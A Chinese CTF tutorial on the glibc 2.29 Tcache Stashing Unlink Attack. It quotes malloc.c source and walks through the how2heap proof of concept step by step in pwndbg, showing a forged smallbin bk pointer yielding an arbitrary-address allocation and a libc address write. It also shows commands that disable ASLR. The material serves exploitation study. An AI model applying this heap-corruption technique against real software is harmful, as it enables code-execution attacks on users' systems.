> 参考资料：
>
> [https://www.anquanke.com/post/id/198173](https://www.anquanke.com/post/id/198173)
>
> [https://xz.aliyun.com/t/7192](https://xz.aliyun.com/t/7192)
>
> [https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack](https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack)
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/1qwkkkP0GeQaPupD6EZxq2w](https://pan.baidu.com/s/1qwkkkP0GeQaPupD6EZxq2w)  密码: g04j
>
> --来自百度网盘超级会员V3的分享
>

# 前言
在上一小节中，我们对house of lore的讲解并没有牵扯到tcache，这一小节的对smallbin_attack就牵扯到了tcache，这种攻击方式被命名为Tcache Stashing Unlink Attack。

在glibc 2.29增加了对unsorted bin attack的检查，即检查双向链表的完整性，这使得这个攻击完全失去了作用，但是我们可以使用Tcache Stashing Unlink Attack攻击方式。

> 源码下载地址：[http://ftp.gnu.org/gnu/glibc/](http://ftp.gnu.org/gnu/glibc/)
>
> 这里下载的是glibc-2.29.tar.gz，也可以到附件中下载
>
> 以下源码均为glibc 2.29
>

# 攻击目的
首先来说一下这种攻击方式的目的：

+ 向任意指定位置写入指定值（这个指定值为main_arena）
+ 向任意的地址中分配一个chunk

# 攻击核心
在将smallbin的堆块合并到tcachebin时利用伪造的smallbin bk指针来分配任意内存地址

# 源代码分析
首先来看一下漏洞源代码之前的一些对smallbin的操作：

```c
#malloc.c 第3639-3663行
   /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb)) //nb为所申请的chunk的真实大小。
    { //若申请的chunk大小在smallbin中
      idx = smallbin_index (nb); //获取smallbin的索引
      bin = bin_at (av, idx); //获取smallbin中的chunk指针

      if ((victim = last (bin)) != bin)
        {// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
         // 如果 victim = bin ，那说明该 bin 为空。
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim)) // 检查 bck->fd 是不是 victim，防止伪造
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
              set_inuse_bit_at_offset (victim, nb); // 设置 victim 对应的 inuse 位
              bin->bk = bck; //修改 smallbin 链表，将 small bin 的最后一个 chunk 取出来
              bck->fd = bin;

          if (av != &main_arena)/ 如果不是 main_arena，设置对应的标志
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);// 细致的检查
```

和之前所说的house of lore的源代码大同小异，首先我们要请求一个大小为nb的chunk，若此时堆中有两个空闲的smallbin chunk，根据small bin的FIFO，会对最早释放的small bin进行unlink操作，在unlink之前会有链表的完整性检查__glibc_unlikely (bck->fd != victim)；

在将这个堆块给用户之后，如果对应的tcache bins的数量小于最大数量，则剩余的small bin将会被放入tcache中，源代码如下：

```c
#malloc.c 第3664行-3688行
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb); //遍历整个smallbin，获取相同size 的free chunk
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count //判断对应size tcache链表是否已满
                 											//取出smallbin的末尾chunk
		     && (tc_victim = last (bin)) != bin) //判断取出的chunk是否为bin本身（smallbin是否已空）
		{
		  if (tc_victim != 0)
		    {//如果成功的获取了chunk
		      bck = tc_victim->bk;//获取smallbin中的倒数第二个chunk
		      set_inuse_bit_at_offset (tc_victim, nb); //设置inuse标志位
		      if (av != &main_arena) //如果不是main_arena
			set_non_main_arena (tc_victim); //设置相应的标志位
		      bin->bk = bck;	//取出smallbin中的最后一个chunk
		      bck->fd = bin;	

		      tcache_put (tc_victim, tc_idx); //将其放入到tcache中
	            }
		}
	    }
```

在这里回忆一下上一小节house of lore 在取出chunk时对同时对倒数第二个chunk进行了检查，源码如下：

```c
#house of lore中的检查
	if (__glibc_unlikely (bck->fd != victim)) // 检查 bck->fd 是不是 victim，防止伪造
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
#victim是smallbin的最后一个堆块
```

对比一下就知道，Tcache Stashing Unlink Attack存在的原因是在放入tcache的过程中只是对第一个bin进行了检查，对后续的chunk检查缺失，因此当smallbin的bk指针被修改时，构造得当的情况下可以分配到任意地址。

注意刚才描述的放入过程是一个循环，我们将伪造的bck看成一个堆块，其bk很可能是一个非法的地址，这样就导致循环到下一个堆块时unlink执行到bck->fd = bin;访问非法内存造成程序crash。为了避免这种情况我们选择释放6个对应size的chunk到tcache bin，只为tcache留一个空间，这样循环一次就会跳出，不会有后续问题。

并且tcache_put函数没有做任何的安全检查：

```c
#malloc.c 第2927-2940行
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

# 攻击条件
来看一下攻击条件：

+ 开启tcache机制
+ tcachebin未满（**<font style="color:#F5222D;">有一个位置未填充free chunk</font>**）
+ smallbin中要至少有两个大小相同的free chunk

但是仔细想想这个攻击方式可能有些矛盾：

首先，tcache的机制加入后，free的chunk是优先加入tcachebin中的，同时malloc的时候也优先向tcache中取出free chunk，也就是说tcache机制拥有绝对优先权。

放到smallbin来说，我们不能越过tcache向smallbin中填入chunk，也不能越过tcache从smallbin中取出chunk（除非tcache中bin的总数加起来大于<font style="color:#569cd6;">TCACHE_MAX_BINS（</font>已满））。

进一步说要使用Tcache Stashing Unlink Attack对smallbin发起攻击，条件之一是smallbin中要至少有两个大小相同的free chunk，但是要将free chunk放入smallbin的条件必须是对应size大小的tcachebin链已满，但是这种攻击方式要求对应的tcachebin链不能满，否则无法将free chunk加入到tcache中：

```c
	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count //判断对应size tcache链表是否已满
                 											//取出smallbin的末尾chunk
		     && (tc_victim = last (bin)) != bin) //判断取出的chunk是否为bin本身（smallbin是否已空）
		{
```

这就看起来很矛盾了，会导致这个漏洞无法成功的被利用。

但是calloc函数有一个很特殊的性质，在使用calloc分配堆块时不会从tcachebin中获取chunk，也就是说calloc可以直接分配smallbin中的chunk无论tcachebin满不满，这就可以越过“不能越过tcache从smallbin中取出chunk”这个矛盾。

# 示例
接下来我们使用how2heap中的tcache_stashing_unlink_attack.c示例进行说明：

> 源代码由@yichen师傅进行翻译：[https://www.yuque.com/hxfqg9/bin/qlry85#keGjh](https://www.yuque.com/hxfqg9/bin/qlry85#keGjh)
>

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;
    unsigned long *pp;

    fprintf(stderr, "stack_var 是我们希望分配到的地址，我们首先把 &stack_var[2] 写到 stack_var[3] 来绕过 glibc 的 bck->fd=bin（即 fake chunk->bk 应该是一个可写的地址）\n");
    stack_var[3] = (unsigned long)(&stack_var[2]);
    fprintf(stderr, "修改之后 fake_chunk->bk 是:%p\n",(void*)stack_var[3]);
    fprintf(stderr, "stack_var[4] 的初始值是:%p\n",(void*)stack_var[4]);
    fprintf(stderr, "现在申请 9 个 0x90 的 chunk\n");

    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }
    fprintf(stderr, "先释放 6 个，这 6 个都会放到 tcache 里面\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }
    fprintf(stderr, "接下来的释放的三个里面第一个是最后一个放到 tcache 里面的，后面的都会放到 unsortedbin 中\n");
    
    free(chunk_lis[1]);
    //接下来的就是放到 unsortedbin 了
    free(chunk_lis[0]);
    free(chunk_lis[2]);
    fprintf(stderr, "接下来申请一个大于 0x90 的 chunk，chunk0 和 chunk2 都会被整理到 smallbin 中\n");
    malloc(0xa0);//>0x90
    
    fprintf(stderr, "然后再去从 tcache 中申请两个 0x90 大小的 chunk\n");
    malloc(0x90);
    malloc(0x90);

    fprintf(stderr, "假设有个漏洞，可以把 victim->bk 的指针改写成 fake_chunk 的地址: %p\n",(void*)stack_var);
    chunk_lis[2][1] = (unsigned long)stack_var;
    fprintf(stderr, "现在 calloc 申请一个 0x90 大小的 chunk，他会把一个 smallbin 里的 chunk0 返回给我们，另一个 smallbin 的 chunk2 将会与 tcache 相连.\n");
    pp = calloc(1,0x90);
    
    fprintf(stderr, "这时候我们的 fake_chunk 已经放到了 tcache bin[0xa0] 这个链表中，它的 fd 指针现在指向下一个空闲的块: %p， bck->fd 已经变成了 libc 的地址: %p\n",(void*)stack_var[2],(void*)stack_var[4]);
    target = malloc(0x90);  
    fprintf(stderr, "再次 malloc 0x90 可以看到申请到了 fake_chunk: %p\n",(void*)target); 
    fprintf(stderr, "finish!\n");
    return 0;
}
```

> 编译命令：
>
> gcc -g -fno-stack-protector -z execstack -no-pie -z norelro tcache_stashing_unlink_attack.c -o tcache_stashing_unlink_attack
>

```powershell
#关闭ALSR地址随机化进行调试
ubuntu@ubuntu:~/Desktop/tcache_stashing_unlink_attack$ sudo su
[sudo] password for ubuntu: 
root@ubuntu:/home/ubuntu/Desktop/tcache_stashing_unlink_attack# echo 0 > /proc/sys/kernel/randomize_va_space
root@ubuntu:/home/ubuntu/Desktop/tcache_stashing_unlink_attack# exit
exit
ubuntu@ubuntu:~/Desktop/tcache_stashing_unlink_attack$ 
```

这个poc定义了一个stack_var数组来模拟fake chunk，首先申请了9个大小相同的chunk（b 19）：

```powershell
pwndbg> info local
chunk_lis = {0x602260, 0x602300, 0x6023a0, 0x602440, 0x6024e0, 0x602580, 0x602620, 0x6026c0, 0x602760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```

然后释放6个chunk，chunk会进入tcache中（b 24）：

```powershell
pwndbg> x/300gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x602010:	0x0000000000000000	0x0000000000000006
......
0x602090:	0x0000000000602760	0x0000000000000000
					#指向最后一个tcache free chunk
......
0x602250:	0x0000000000000000	0x00000000000000a1 #chunk1（malloc）
......
0x6022f0:	0x0000000000000000	0x00000000000000a1 #chunk2（malloc）
0x602300:	0x0000000000000000	0x0000000000000000
......
0x602390:	0x0000000000000000	0x00000000000000a1 #chunk3（malloc）
0x6023a0:	0x0000000000000000	0x0000000000000000
......
0x602430:	0x0000000000000000	0x00000000000000a1 #chunk4(free)
0x602440:	0x0000000000000000	0x0000000000602010
															#tcache_key
                              #防止tcache double free（可以绕过）
......
0x6024d0:	0x0000000000000000	0x00000000000000a1 #chunk5(free)
0x6024e0:	0x0000000000602440	0x0000000000602010
......
0x602570:	0x0000000000000000	0x00000000000000a1 #chunk6(free)
0x602580:	0x00000000006024e0	0x0000000000602010
......
0x602610:	0x0000000000000000	0x00000000000000a1 #chunk7(free)
0x602620:	0x0000000000602580	0x0000000000602010
......
0x6026b0:	0x0000000000000000	0x00000000000000a1 #chunk8(free)
0x6026c0:	0x0000000000602620	0x0000000000602010
......
0x602750:	0x0000000000000000	0x00000000000000a1 #chunk9(free)
0x602760:	0x00000000006026c0	0x0000000000602010
......
0x6027f0:	0x0000000000000000	0x0000000000020811 #top_chunk
......
0x602950:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0xa0 [  6]: 0x602760 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

再次free三个chunk，第一个进入tcache中，其余进入unsortedbin中（b 30）：

```powershell
pwndbg> bin
tcachebins
0xa0 [  7]: 0x602300 —▸ 0x602760 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— nop     /* 0x602390 */
smallbins
empty
largebins
empty
pwndbg> x/300gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x602010:	0x0000000000000000	0x0000000000000007
......
0x602090:	0x0000000000602300	0x0000000000000000
					#指向最后一个tcache free chunk
......
0x602250:	0x0000000000000000	0x00000000000000a1 #chunk1（free-unsortedbin）
0x602260:	0x00007ffff7dcdca0	0x0000000000602390
......
0x6022f0:	0x0000000000000000	0x00000000000000a1 #chunk2（free-tcachebin）
0x602300:	0x0000000000602760	0x0000000000602010
......
0x602390:	0x0000000000000000	0x00000000000000a1 #chunk3（free-unsortedbin）
0x6023a0:	0x0000000000602250	0x00007ffff7dcdca0
......
0x602430:	0x0000000000000000	0x00000000000000a1 #chunk4(free-tcachebin)
0x602440:	0x0000000000000000	0x0000000000602010
															#tcache_key
                              #防止tcache double free（可以绕过）
......
0x6024d0:	0x0000000000000000	0x00000000000000a1 #chunk5(free-tcachebin)
0x6024e0:	0x0000000000602440	0x0000000000602010
......
0x602570:	0x0000000000000000	0x00000000000000a1 #chunk6(free-tcachebin)
0x602580:	0x00000000006024e0	0x0000000000602010
......
0x602610:	0x0000000000000000	0x00000000000000a1 #chunk7(free-tcachebin)
0x602620:	0x0000000000602580	0x0000000000602010
......
0x6026b0:	0x0000000000000000	0x00000000000000a1 #chunk8(free-tcachebin)
0x6026c0:	0x0000000000602620	0x0000000000602010
......
0x602750:	0x0000000000000000	0x00000000000000a1 #chunk9(free-tcachebin)
0x602760:	0x00000000006026c0	0x0000000000602010
......
0x6027f0:	0x0000000000000000	0x0000000000020811 #top_chunk
......
0x602950:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后申请比较大的chunk，这时会调用malloc_consolidate对unsortedbin中free chunk进行整理（b 33）：

```powershell
pwndbg> bin
tcachebins
0xa0 [  7]: 0x602300 —▸ 0x602760 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— nop     /* 0x602390 */
largebins
empty
pwndbg> x/300gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x602010:	0x0000000000000000	0x0000000000000007
......
0x602090:	0x0000000000602300	0x0000000000000000
					#指向最后一个tcache free chunk
......
0x602250:	0x0000000000000000	0x00000000000000a1 #chunk1（free-smallbin）
0x602260:	0x00007ffff7dcdd30	0x0000000000602390
......
0x6022f0:	0x0000000000000000	0x00000000000000a1 #chunk2（free-tcachebin）
0x602300:	0x0000000000602760	0x0000000000602010
......
0x602390:	0x0000000000000000	0x00000000000000a1 #chunk3（free-smallbin）
0x6023a0:	0x0000000000602250	0x00007ffff7dcdd30
......
0x602430:	0x0000000000000000	0x00000000000000a1 #chunk4(free-tcachebin)
0x602440:	0x0000000000000000	0x0000000000602010
															#tcache_key
                              #防止tcache double free（可以绕过）
......
0x6024d0:	0x0000000000000000	0x00000000000000a1 #chunk5(free-tcachebin)
0x6024e0:	0x0000000000602440	0x0000000000602010
......
0x602570:	0x0000000000000000	0x00000000000000a1 #chunk6(free-tcachebin)
0x602580:	0x00000000006024e0	0x0000000000602010
......
0x602610:	0x0000000000000000	0x00000000000000a1 #chunk7(free-tcachebin)
0x602620:	0x0000000000602580	0x0000000000602010
......
0x6026b0:	0x0000000000000000	0x00000000000000a1 #chunk8(free-tcachebin)
0x6026c0:	0x0000000000602620	0x0000000000602010
......
0x602750:	0x0000000000000000	0x00000000000000a1 #chunk9(free-tcachebin)
0x602760:	0x00000000006026c0	0x0000000000602010
......
0x6027f0:	0x0000000000000000	0x00000000000000b1 #malloc
......
0x6028a0:	0x0000000000000000	0x0000000000020761 #top_chunk
......
0x602950:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

因为Tcache Stashing Unlink Attack要求tcachebin未满，因此这里申请两个chunk（b 37）：

```powershell
pwndbg> x/300gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x602010:	0x0000000000000000	0x0000000000000005
......
0x602090:	0x00000000006026c0	0x0000000000000000
					#指向最后一个tcache free chunk
......
0x602250:	0x0000000000000000	0x00000000000000a1 #chunk1（free-smallbin）
0x602260:	0x00007ffff7dcdd30	0x0000000000602390
......
0x6022f0:	0x0000000000000000	0x00000000000000a1 #chunk2（malloc）
0x602300:	0x0000000000602760	0x0000000000000000
......
0x602390:	0x0000000000000000	0x00000000000000a1 #chunk3（free-smallbin）
0x6023a0:	0x0000000000602250	0x00007ffff7dcdd30
......
0x602430:	0x0000000000000000	0x00000000000000a1 #chunk4(free-tcachebin)
0x602440:	0x0000000000000000	0x0000000000602010
															#tcache_key
                              #防止tcache double free（可以绕过）
......
0x6024d0:	0x0000000000000000	0x00000000000000a1 #chunk5(free-tcachebin)
0x6024e0:	0x0000000000602440	0x0000000000602010
......
0x602570:	0x0000000000000000	0x00000000000000a1 #chunk6(free-tcachebin)
0x602580:	0x00000000006024e0	0x0000000000602010
......
0x602610:	0x0000000000000000	0x00000000000000a1 #chunk7(free-tcachebin)
0x602620:	0x0000000000602580	0x0000000000602010
......
0x6026b0:	0x0000000000000000	0x00000000000000a1 #chunk8(free-tcachebin)
0x6026c0:	0x0000000000602620	0x0000000000602010
......
0x602750:	0x0000000000000000	0x00000000000000a1 #chunk9(malloc)
0x602760:	0x00000000006026c0	000000000000000000
......
0x6027f0:	0x0000000000000000	0x00000000000000b1 #chunk10(malloc)
......
0x6028a0:	0x0000000000000000	0x0000000000020761 #top_chunk
......
0x602950:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0xa0 [  5]: 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— nop     /* 0x602390 */
largebins
empty
pwndbg> 
```

模拟 UAF 漏洞修改bk为fake_chunk(b 39)：

```c
pwndbg> bin
tcachebins
0xa0 [  5]: 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— nop     /* 0x602390 */
BK: 0x602250 —▸ 0x602390 —▸ 0x7fffffffdd10 —▸ 0x7fffffffdd20 ◂— 0x0
largebins
empty
pwndbg> x/16gx 0x602390
0x602390:	0x0000000000000000	0x00000000000000a1 #chunk3（free-smallbin）
0x6023a0:	0x0000000000602250	0x00007fffffffdd10
0x6023b0:	0x0000000000000000	0x0000000000000000
0x6023c0:	0x0000000000000000	0x0000000000000000
0x6023d0:	0x0000000000000000	0x0000000000000000
0x6023e0:	0x0000000000000000	0x0000000000000000
0x6023f0:	0x0000000000000000	0x0000000000000000
0x602400:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

由于smallbin是按照bk指针寻块的，分配的顺序应当是：0x602250 —▸ 0x602390 —▸ 0x7fffffffdd10（FIFO）,

调用calloc之后再查看堆布局（b 42）：

```powershell
pwndbg> bin
tcachebins
0xa0 [  7]: 0x7fffffffdd20 —▸ 0x6023a0 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x602390 —▸ 0x6026c0 ◂— 0x0
BK: 0x7fffffffdd20 ◂— 0x0
largebins
empty
pwndbg> p pp
$1 = (unsigned long *) 0x602260
pwndbg> x/16gx stack_var
0x7fffffffdd10:	0x0000000000000000	0x0000000000000000
0x7fffffffdd20:	0x00000000006023a0	0x0000000000602010
0x7fffffffdd30:	0x00007ffff7dcdd30	0x0000000000000000
								#libc-main_arena
0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
0x7fffffffdd50:	0x0000000000000000	0x0000000000000000
0x7fffffffdd60:	0x0000000000000000	0x0000000000000000
0x7fffffffdd70:	0x0000000000000000	0x0000000000000000
0x7fffffffdd80:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x00007ffff7dcdd30
0x7ffff7dcdd30 <main_arena+240>:	0x00007ffff7dcdd20	0x00007ffff7dcdd20
0x7ffff7dcdd40 <main_arena+256>:	0x0000000000602390	0x00007fffffffdd20
0x7ffff7dcdd50 <main_arena+272>:	0x00007ffff7dcdd40	0x00007ffff7dcdd40
0x7ffff7dcdd60 <main_arena+288>:	0x00007ffff7dcdd50	0x00007ffff7dcdd50
0x7ffff7dcdd70 <main_arena+304>:	0x00007ffff7dcdd60	0x00007ffff7dcdd60
0x7ffff7dcdd80 <main_arena+320>:	0x00007ffff7dcdd70	0x00007ffff7dcdd70
0x7ffff7dcdd90 <main_arena+336>:	0x00007ffff7dcdd80	0x00007ffff7dcdd80
0x7ffff7dcdda0 <main_arena+352>:	0x00007ffff7dcdd90	0x00007ffff7dcdd90
pwndbg> 
```

calloc之后fake_chunk已经被链入tcachebin，且因为分配顺序变成了 LIFO , 0x7fffffffdd20-0x10 这个块被提到了链表头，下次 malloc(0x90) 即可获得这个块。同时要注意，在smallbin unlink的过程中，由于bck->fd=bin 的赋值操作使得 0x7fffffffdd20+0x10 处**<font style="color:#F5222D;">写入了一个 libc 地址</font>**。

再次malloc就会控制栈上的地址：

```c
pwndbg> p target
$2 = (unsigned long *) 0x7fffffffdd20
pwndbg> x/16gx stack_var
0x7fffffffdd10:	0x0000000000000000	0x0000000000000000 #malloc
0x7fffffffdd20:	0x00000000006023a0	0x0000000000000000
0x7fffffffdd30:	0x00007ffff7dcdd30	0x0000000000000000
    			#main_arena
0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
0x7fffffffdd50:	0x0000000000000000	0x0000000000000000
0x7fffffffdd60:	0x0000000000000000	0x0000000000000000
0x7fffffffdd70:	0x0000000000000000	0x0000000000000000
0x7fffffffdd80:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

# 总结
Tcache Stashing Unlink Attack修改bk为target_addr，malloc后会控制target_addr-0x10，会在target_addr+0x10处写入main_arena_addr

